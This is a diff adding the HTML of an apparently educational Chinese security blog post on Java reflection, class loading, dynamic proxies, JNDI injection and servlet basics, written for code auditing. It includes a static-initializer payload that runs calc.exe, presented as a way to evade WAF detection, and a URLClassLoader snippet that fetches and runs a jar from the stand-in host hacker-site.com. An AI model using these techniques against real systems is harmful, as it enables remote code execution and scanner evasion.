@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Java基础 | H4ck3r Station</title>
+<meta name="keywords" content="">
+<meta name="description" content="JAVA 反射
+什么是java的反射
+java反射就是在程序运行状态中，能够知道任何一个类的所有属性和方法，并且能够调用这些属性和方法的功能
+正向 VS 反向
+正向流程： 导入类 &ndash;&gt; new对象 &ndash;&gt; 调用对象
+User user = new User(); user.login();
+如果类不存在就报错
+**反向流程：**拿到字符串类名 &ndash;&gt; 让JVM去找这个类 &ndash;&gt; 强行拆解这个类 &ndash;&gt;  调用里面的东西
+Class.forName(&#34;com.User&#34;).getMethod(&#34;login&#34;).invoke(obj);
+动态加载类，即使编译时类还没有也能运行
+类加载机制
+什么是类加载
+java代码进行编译后就是.class文件（字节码），类加载就是把这些二进制数据读进内存，解析并生成一个java.lang.Class对象的过程
+类加载的三个阶段
+Loading（加载） 读取字节流，不执行代码
+Linking（链接） 分为验证，准备，解析。 一般不执行代码
+lnitialization(初始化) 执行静态代码块，静态变量的赋值动作
+两种攻击方式：
+例子：
+class Evil {
+    // 1. 静态变量赋值
+    public static int a = runCommand(); 
+
+    // 2. 静态代码块
+    static {
+        System.out.println(&#34;静态代码块被执行了&#34;);
+    }
+
+    public static int runCommand() {
+        System.out.println(&#34;静态变量赋值触发了恶意方法！&#34;);
+        return 1;
+    }
+}
+会会先执行赋值，然后是静态代码块。因为初始化执行的顺序是 “静态变量赋值” 和 “静态代码块”">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/java%E5%9F%BA%E7%A1%80/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/java%E5%9F%BA%E7%A1%80/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="H4ck3r Station (Alt + H)">H4ck3r Station</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts/" title="档案">
+                    <span>档案</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Java基础
+    </h1>
+    <div class="post-meta"><span title='2026-02-16 00:00:00 +0000 UTC'>February 16, 2026</span>&nbsp;·&nbsp;<span>5 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#java-%e5%8f%8d%e5%b0%84" aria-label="JAVA 反射">JAVA 反射</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afjava%e7%9a%84%e5%8f%8d%e5%b0%84" aria-label="什么是java的反射">什么是java的反射</a></li>
+                <li>
+                    <a href="#%e6%ad%a3%e5%90%91-vs-%e5%8f%8d%e5%90%91" aria-label="正向 VS 反向">正向 VS 反向</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#%e7%b1%bb%e5%8a%a0%e8%bd%bd%e6%9c%ba%e5%88%b6" aria-label="类加载机制">类加载机制</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e7%b1%bb%e5%8a%a0%e8%bd%bd" aria-label="什么是类加载">什么是类加载</a></li>
+                <li>
+                    <a href="#%e7%b1%bb%e5%8a%a0%e8%bd%bd%e7%9a%84%e4%b8%89%e4%b8%aa%e9%98%b6%e6%ae%b5" aria-label="类加载的三个阶段">类加载的三个阶段</a><ul>
+                        
+                <li>
+                    <a href="#%e4%b8%a4%e7%a7%8d%e6%94%bb%e5%87%bb%e6%96%b9%e5%bc%8f" aria-label="两种攻击方式：">两种攻击方式：</a></li></ul>
+                </li></ul>
+                    
+                <li>
+                    <a href="#%e5%8f%8c%e4%ba%b2%e5%a7%94%e6%b4%be%e6%a8%a1%e5%9e%8b" aria-label="双亲委派模型">双亲委派模型</a><ul>
+                        
+                <li>
+                    <a href="#%e9%82%a3%e6%80%8e%e4%b9%88%e8%bf%9b%e8%a1%8c%e7%bb%95%e8%bf%87%e5%91%a2" aria-label="那怎么进行绕过呢">那怎么进行绕过呢</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86" aria-label="动态代理">动态代理</a><ul>
+                        <ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e4%bb%a3%e7%90%86" aria-label="什么是代理：">什么是代理：</a></li>
+                <li>
+                    <a href="#%e4%bb%a3%e7%90%86%e6%a8%a1%e5%bc%8f%e5%88%86%e7%b1%bb" aria-label="代理模式分类：">代理模式分类：</a></li></ul>
+                    </ul>
+                    
+                <li>
+                    <a href="#%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86-1" aria-label="动态代理">动态代理</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#jdk%e5%8a%a8%e6%80%81%e4%bb%a3%e7%90%86%e7%9a%84%e4%b8%a4%e4%b8%aa%e6%a0%b8%e5%bf%83%e7%b1%bb" aria-label="JDK动态代理的两个核心类">JDK动态代理的两个核心类</a></li></ul>
+                    
+                <li>
+                    <a href="#%e5%a6%82%e4%bd%95%e5%ae%a1%e8%ae%a1" aria-label="如何审计">如何审计</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#jndi%e5%92%8crmildap" aria-label="JNDI和RMI/LDAP">JNDI和RMI/LDAP</a><ul>
+                        
+                <li>
+                    <a href="#rmi-%e8%bf%9c%e7%a8%8b%e6%96%b9%e6%b3%95%e8%b0%83%e7%94%a8" aria-label="RMI （远程方法调用）">RMI （远程方法调用）</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e5%b7%a5%e4%bd%9c%e7%9a%84%e4%b8%89%e4%b8%aa%e8%a7%92%e8%89%b2" aria-label="工作的三个角色：">工作的三个角色：</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#ldap%e8%bd%bb%e9%87%8f%e7%ba%a7%e7%9b%ae%e5%bd%95%e8%ae%bf%e9%97%ae%e5%8d%8f%e8%ae%ae" aria-label="LDAP（轻量级目录访问协议）">LDAP（轻量级目录访问协议）</a><ul>
+                        
+                <li>
+                    <a href="#ldap%e6%b3%a8%e5%85%a5" aria-label="LDAP注入">LDAP注入</a></li></ul>
+                </li>
+                <li>
+                    <a href="#jndi-java%e5%91%bd%e5%90%8d%e5%92%8c%e7%9b%ae%e5%bd%95%e6%8e%a5%e5%8f%a3" aria-label="JNDI (java命名和目录接口)">JNDI (java命名和目录接口)</a></li>
+                <li>
+                    <a href="#jdk-%e4%b8%8d%e5%90%8c%e7%89%88%e6%9c%ac" aria-label="JDK 不同版本">JDK 不同版本</a></li></ul>
+                </li>
+                <li>
+                    <a href="#java-web-%e5%ba%94%e7%94%a8" aria-label="JAVA WEB 应用">JAVA WEB 应用</a><ul>
+                        <ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e7%94%b1%e4%b8%89%e4%b8%aa%e9%83%a8%e5%88%86%e7%bb%84%e6%88%90" aria-label="由三个部分组成：">由三个部分组成：</a></li>
+                <li>
+                    <a href="#%e8%bf%90%e8%a1%8c%e7%8e%af%e5%a2%83" aria-label="运行环境">运行环境</a></li></ul>
+                    </ul>
+                    
+                <li>
+                    <a href="#listener" aria-label="listener">listener</a></li>
+                <li>
+                    <a href="#filter" aria-label="FIlter">FIlter</a></li>
+                <li>
+                    <a href="#servlet-%e5%ae%b9%e5%99%a8" aria-label="Servlet 容器">Servlet 容器</a><ul>
+                        
+                <li>
+                    <a href="#1-servlet-%e5%88%9d%e5%a7%8b%e5%8c%96" aria-label="1. Servlet 初始化">1. Servlet 初始化</a></li>
+                <li>
+                    <a href="#2-servlet-%e5%a4%84%e7%90%86%e5%ae%a2%e6%88%b7%e7%ab%af%e8%af%b7%e6%b1%82%e7%9a%84%e6%a0%b8%e5%bf%83%e5%85%a5%e5%8f%a3" aria-label="2. Servlet 处理客户端请求的核心入口">2. Servlet 处理客户端请求的核心入口</a></li>
+                <li>
+                    <a href="#3-%e5%ae%a2%e6%88%b7%e7%ab%af%e9%80%9a%e8%bf%87-http-get-%e6%96%b9%e5%bc%8f%e5%8f%91%e9%80%81%e7%9a%84%e8%af%b7%e6%b1%82" aria-label="3. 客户端通过 HTTP GET 方式发送的请求">3. 客户端通过 HTTP GET 方式发送的请求</a></li>
+                <li>
+                    <a href="#4-%e5%ae%a2%e6%88%b7%e7%ab%af%e9%80%9a%e8%bf%87-http-post-%e6%96%b9%e6%b3%95%e5%8f%91%e9%80%81%e7%9a%84%e8%af%b7%e6%b1%82" aria-label="4. 客户端通过 HTTP POST 方法发送的请求">4. 客户端通过 HTTP POST 方法发送的请求</a></li>
+                <li>
+                    <a href="#5-servlet-%e8%a2%ab%e9%94%80%e6%af%81" aria-label="5. Servlet 被销毁">5. Servlet 被销毁</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e6%80%bb%e7%bb%93" aria-label="总结">总结</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="java-反射">JAVA 反射<a hidden class="anchor" aria-hidden="true" href="#java-反射">#</a></h3>
+<h5 id="什么是java的反射">什么是java的反射<a hidden class="anchor" aria-hidden="true" href="#什么是java的反射">#</a></h5>
+<p>java反射就是在程序运行状态中，能够知道任何一个类的所有属性和方法，并且能够调用这些属性和方法的功能</p>
+<h5 id="正向-vs-反向">正向 VS 反向<a hidden class="anchor" aria-hidden="true" href="#正向-vs-反向">#</a></h5>
+<p><strong>正向流程：</strong> 导入类 &ndash;&gt; <code>new</code>对象 &ndash;&gt; 调用对象</p>
+<pre tabindex="0"><code>User user = new User(); user.login();
+</code></pre><p>如果类不存在就报错</p>
+<p>**反向流程：**拿到字符串类名 &ndash;&gt; 让JVM去找这个类 &ndash;&gt; 强行拆解这个类 &ndash;&gt;  调用里面的东西</p>
+<pre tabindex="0"><code>Class.forName(&#34;com.User&#34;).getMethod(&#34;login&#34;).invoke(obj);
+</code></pre><p>动态加载类，即使编译时类还没有也能运行</p>
+<h3 id="类加载机制">类加载机制<a hidden class="anchor" aria-hidden="true" href="#类加载机制">#</a></h3>
+<h5 id="什么是类加载">什么是类加载<a hidden class="anchor" aria-hidden="true" href="#什么是类加载">#</a></h5>
+<p>java代码进行编译后就是<code>.class</code>文件（字节码），类加载就是把这些二进制数据读进内存，解析并生成一个<code>java.lang.Class</code>对象的过程</p>
+<h5 id="类加载的三个阶段">类加载的三个阶段<a hidden class="anchor" aria-hidden="true" href="#类加载的三个阶段">#</a></h5>
+<pre tabindex="0"><code>Loading（加载） 读取字节流，不执行代码
+Linking（链接） 分为验证，准备，解析。 一般不执行代码
+lnitialization(初始化) 执行静态代码块，静态变量的赋值动作
+</code></pre><h6 id="两种攻击方式">两种攻击方式：<a hidden class="anchor" aria-hidden="true" href="#两种攻击方式">#</a></h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>例子<span style="color:#960050;background-color:#1e0010">：</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Evil</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 1. 静态变量赋值</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> a <span style="color:#f92672">=</span> runCommand(); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 2. 静态代码块</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;静态代码块被执行了&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">runCommand</span>() {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;静态变量赋值触发了恶意方法！&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> 1;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>会会先执行赋值，然后是静态代码块。因为初始化执行的顺序是 “静态变量赋值” 和 “静态代码块”</p>
+<p><strong>绕WAF：</strong> WAF或者代码扫描工具会盯着<code>static ()</code>这种特征。可以使用将恶意逻辑隐藏在静态变量赋值中：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SneakyEvil</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 看起来只是一个普通的变量定义</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 但实际上，getRuntime() 会在类初始化时立即执行</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Process p <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 没有 static {} 代码块，扫描工具可能漏报</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>只要初始化就会执行，不需要实例化</p>
+<p>审计判断：</p>
+<p>判断 <code>Class.forName(&quot;TargetClass&quot;)</code> 是否危险时，要检查 <code>TargetClass</code> 里：</p>
+<ol>
+<li>有没有 <code>static { ... }</code> 且里面有危险代码？</li>
+<li>有没有 <code>static Type var = dangerousMethod();</code> 这种赋值操作？</li>
+</ol>
+<h4 id="双亲委派模型">双亲委派模型<a hidden class="anchor" aria-hidden="true" href="#双亲委派模型">#</a></h4>
+<p>为了保证恶意类不会被加载</p>
+<pre tabindex="0"><code>Bootstrap ClassLoader（启动类 加载器）： 负责加载JDK核心库
+Extension ClassLoader (扩展类 加载器) ： 负责加载JDK扩展目录（jre/lib/ext）下的包
+App/System ClassLoader（应用类 加载器）； 负责加载写的代码
+</code></pre><h5 id="那怎么进行绕过呢">那怎么进行绕过呢<a hidden class="anchor" aria-hidden="true" href="#那怎么进行绕过呢">#</a></h5>
+<p>有以下几个方法</p>
+<ol>
+<li>
+<p><code>URLClassLoader</code></p>
+<p>java允许远程加载类</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 攻击者可控的 URL</span>
+</span></span><span style="display:flex;"><span>URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://hacker-site.com/malicious.jar&#34;</span>); 
+</span></span><span style="display:flex;"><span>URLClassLoader loader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URLClassLoader(<span style="color:#66d9ef">new</span> URL<span style="color:#f92672">[]</span>{url});
+</span></span><span style="display:flex;"><span>Class<span style="color:#f92672">&lt;?&gt;</span> evil <span style="color:#f92672">=</span> loader.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;Exploit&#34;</span>); <span style="color:#75715e">// 远程加载木马</span>
+</span></span><span style="display:flex;"><span>evil.<span style="color:#a6e22e">newInstance</span>(); <span style="color:#75715e">// 执行</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>defineClass</code></p>
+<p>ClassLoader 中最底层的方法（<code>protected</code>）。它接受一个 <strong><code>byte[]</code> 数组</strong>，直接把它变成 Class 对象。</p>
+<p>像冰蝎，哥斯拉等webshell工具，通过HTTP POST发送一段加密的字节码，服务端被植入的webshell会调用<code>defineClass</code>将字节码转换成内存中的类运行</p>
+</li>
+<li>
+<p>线程上下文类加载器</p>
+<p>有些框架（如 Tomcat, Spring）为了实现热部署，破坏了双亲委派模型（自己优先加载，找不到再给父类）。</p>
+<p>这种机制有时会导致“类加载隔离失效”，或者被利用来加载 WEB-INF 下的敏感类</p>
+</li>
+</ol>
+<h3 id="动态代理">动态代理<a hidden class="anchor" aria-hidden="true" href="#动态代理">#</a></h3>
+<h6 id="什么是代理">什么是代理：<a hidden class="anchor" aria-hidden="true" href="#什么是代理">#</a></h6>
+<p>为其他对象提供一种代理以便控制对这个对象的访问（所谓控制，就是可以在其调用行为前后分别加入一些操作）</p>
+<h6 id="代理模式分类">代理模式分类：<a hidden class="anchor" aria-hidden="true" href="#代理模式分类">#</a></h6>
+<ol>
+<li>静态代理，实质是类的继承或接口的实现</li>
+<li><strong>动态代理</strong>（jdk动态代理），发生反序列化漏洞的地方</li>
+<li>cglib动态代理</li>
+</ol>
+<p>注：简单讲解一下静态代理，如某个程序员读源码发现某个地方可以增强, 比如某个函数执行前或执行后应该做一些操作，直接修改原有代码容易出错。 做法就是自己实现一个类，和原始类相同，通过在方法中引用老程序的方法来实现自己的方法，从而实现在不改动源代码的基础上达到增强方法的目的</p>
+<h4 id="动态代理-1">动态代理<a hidden class="anchor" aria-hidden="true" href="#动态代理-1">#</a></h4>
+<p>静态代理模式有个问题，当类方法数量越来越多，代理类的代码量是十分庞大的</p>
+<p>所以引入动态代理解决这个问题，动态代理的动态在于，他不是在代码中写死的，而是<strong>通过反射机制</strong>动态生成的</p>
+<h6 id="jdk动态代理的两个核心类">JDK动态代理的两个核心类<a hidden class="anchor" aria-hidden="true" href="#jdk动态代理的两个核心类">#</a></h6>
+<ol>
+<li><code>java.lang.reflect.Proxy</code> 生成代理对象</li>
+<li><code>java.lang.reflect.InvocationHandler</code>所有对代理对象的方法调用，都会被转发到<code>invoke</code>方法</li>
+</ol>
+<h5 id="如何审计">如何审计<a hidden class="anchor" aria-hidden="true" href="#如何审计">#</a></h5>
+<p><strong>查找 <code>InvocationHandler</code> 的实现类：</strong></p>
+<ul>
+<li>看看哪些类实现了这个接口。</li>
+<li><strong>重点看 <code>invoke</code> 方法体：</strong> 里面有没有危险操作？有没有把 <code>method.invoke</code> 的参数放得太宽？</li>
+</ul>
+<p><strong>查找 <code>Proxy.newProxyInstance</code>：</strong></p>
+<ul>
+<li>生成的代理对象流向了哪里？</li>
+<li>如果它被转换成了某个接口，并传入了敏感流程（如权限校验、文件操作），攻击者可能通过代理绕过校验。</li>
+</ul>
+<p><strong>反序列化入口 (readObject)：</strong></p>
+<ul>
+<li>如果在 <code>readObject</code> 中对某个字段调用了方法，而这个字段是可以被反序列化控制的，那么攻击者可以传入一个动态代理，把这个方法调用“重定向”到任意位置。</li>
+</ul>
+<h3 id="jndi和rmildap">JNDI和RMI/LDAP<a hidden class="anchor" aria-hidden="true" href="#jndi和rmildap">#</a></h3>
+<h4 id="rmi-远程方法调用">RMI （远程方法调用）<a hidden class="anchor" aria-hidden="true" href="#rmi-远程方法调用">#</a></h4>
+<p>是 Java 的一种 RPC（远程过程调用）机制。 简单来说，它允许<strong>A 机器上的 Java 程序，去调用 B 机器上的对象方法</strong>，就像调用本地方法一样简单。</p>
+<ul>
+<li><strong>本地调用：</strong> <code>User user = new User(); user.sayHello();</code></li>
+<li><strong>RMI 调用：</strong> <code>User user = (User) registry.lookup(&quot;User&quot;); user.sayHello();</code></li>
+</ul>
+<h6 id="工作的三个角色">工作的三个角色：<a hidden class="anchor" aria-hidden="true" href="#工作的三个角色">#</a></h6>
+<p><strong>Stub (存根)：</strong> 客户端的代理对象（类似动态代理）。它负责把请求打包（序列化）并发给服务端。</p>
+<p><strong>Skeleton (骨架)：</strong> 服务端的监听器。它负责接收数据包，解包（反序列化），调用真正的服务端代码，再把结果返回给客户端。</p>
+<p><strong>Registry (注册中心)：</strong> 像一个电话本。服务端把对象<strong>绑定 (bind)</strong> 到一个名字上，客户端去<strong>查找 (lookup)</strong> 这个名字。</p>
+<h4 id="ldap轻量级目录访问协议">LDAP（轻量级目录访问协议）<a hidden class="anchor" aria-hidden="true" href="#ldap轻量级目录访问协议">#</a></h4>
+<p>一个通用的<strong>目录服务</strong>协议</p>
+<p>因为 Java 的 JNDI 接口支持 LDAP 协议，而且 LDAP 允许在条目中存储 <strong>Java 对象数据</strong></p>
+<h5 id="ldap注入">LDAP注入<a hidden class="anchor" aria-hidden="true" href="#ldap注入">#</a></h5>
+<p>LDAP除了能返回数据，还可以返回：</p>
+<ol>
+<li>序列化对象： 返回base64后的二进制，客户端你拿到后自动反序列化</li>
+<li>JNDI引用： 返回URL。 这也是Log4j漏洞的根源</li>
+</ol>
+<h4 id="jndi-java命名和目录接口">JNDI (java命名和目录接口)<a hidden class="anchor" aria-hidden="true" href="#jndi-java命名和目录接口">#</a></h4>
+<p>Java 搞的一套<strong>统一接口</strong>。它的初衷是让你可以用统一的方式去查找资源（对象、配置、数据库连接）。</p>
+<p>但是方便就意味着不安全著名的 <code>JNDI</code>注入就出现在此.</p>
+<p>JNDI 支持一种引用机制，当查找对象时候对象在本地找不到就会去远程下载</p>
+<h4 id="jdk-不同版本">JDK 不同版本<a hidden class="anchor" aria-hidden="true" href="#jdk-不同版本">#</a></h4>
+<p>**JDK &lt; 8u121：**RMI 和 LDAP 都允许加载远程代码，直接 RCE。</p>
+<p><strong>JDK 8u121 ~ 8u191：</strong></p>
+<ul>
+<li>
+<p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code>。</p>
+<p>虽然 rmi不能使用，但是还有 LDAP</p>
+</li>
+</ul>
+<p><strong>JDK &gt; 8u191：</strong></p>
+<ul>
+<li>
+<p><code>com.sun.jndi.ldap.object.trustURLCodebase</code> 也默认为 <code>false</code>LDAP也不能使用。</p>
+<p>但是这并不意味着安全，还有很多绕过的方法，水平有限不过多讲解</p>
+</li>
+</ul>
+<h3 id="java-web-应用">JAVA WEB 应用<a hidden class="anchor" aria-hidden="true" href="#java-web-应用">#</a></h3>
+<p>Java Web 应用是基于 Java 技术开发，运行在 Web 服务器或 Servlet 容器上的动态网站或在线服务。</p>
+<h6 id="由三个部分组成">由三个部分组成：<a hidden class="anchor" aria-hidden="true" href="#由三个部分组成">#</a></h6>
+<p>静态资源： &hellip;.</p>
+<p>动态组件: <strong>Servlet、Filter、Interceptor、Listener</strong>。它们负责处理逻辑、拦截请求、保护安全。</p>
+<p>配置文件: 老项目：<code>web.xml</code>  新项目（spring boot）： <code>application.yml</code> 或纯 Java 代码配置</p>
+<h6 id="运行环境">运行环境<a hidden class="anchor" aria-hidden="true" href="#运行环境">#</a></h6>
+<p>Java Web 程序不能像普通的 <code>.exe</code> 一样双击运行，它需要一个**“容器”**（也叫 Web 中间件）。</p>
+<p><strong>常见的容器</strong>：Tomcat、Jetty、JBoss、WebLogic。</p>
+<p><strong>容器的作用</strong>：</p>
+<ol>
+<li>监听网络端口（如 8080）</li>
+<li>接收 HTTP 请求</li>
+<li>把请求翻译成 Java 对象（<code>HttpServletRequest</code>）</li>
+<li>交给你的代码（Servlet/Filter）去处理</li>
+</ol>
+<h4 id="listener">listener<a hidden class="anchor" aria-hidden="true" href="#listener">#</a></h4>
+<ol>
+<li><strong>监听启动</strong></li>
+</ol>
+<ul>
+<li>
+<p>当 Web 应用启动时，Servlet 容器会调用此方法。</p>
+</li>
+<li>
+<p>你可以在这里编写初始化代码，比如加载配置文件、初始化数据库连接池、启动后台任务等。</p>
+</li>
+<li>
+<p>这是 Web 应用的“入口”钩子方法。</p>
+</li>
+</ul>
+<p>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">contextInitialized</span>(ServletContextEvent sce)
+</span></span></code></pre></div><p>参数 <code>ServletContextEvent sce </code>提供对 <code>ServletContext </code>（应用上下文）的访问。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">contextInitialized</span>(ServletContextEvent sce) {
+</span></span><span style="display:flex;"><span>	System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;AppListener.contextInitialized&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ol start="2">
+<li><strong>监听关闭</strong></li>
+</ol>
+<ul>
+<li>当 Web 应用关闭或被卸载时，Servlet 容器会调用此方法。</li>
+<li>你可以在这里释放资源，比如关闭数据库连接池、停止后台线程、清理缓存等。</li>
+<li>是 Web 应用关闭时的清理钩子。</li>
+</ul>
+<p>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">contextDestroyed</span>(ServletContextEvent sce)
+</span></span></code></pre></div><p>参数 <code>ServletContextEvent sce</code> 提供对 <code>ServletContext</code> 的访问。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">contextDestroyed</span>(ServletContextEvent sce) {
+</span></span><span style="display:flex;"><span>	System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;AppListener.contextDestroyed&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="filter">FIlter<a hidden class="anchor" aria-hidden="true" href="#filter">#</a></h4>
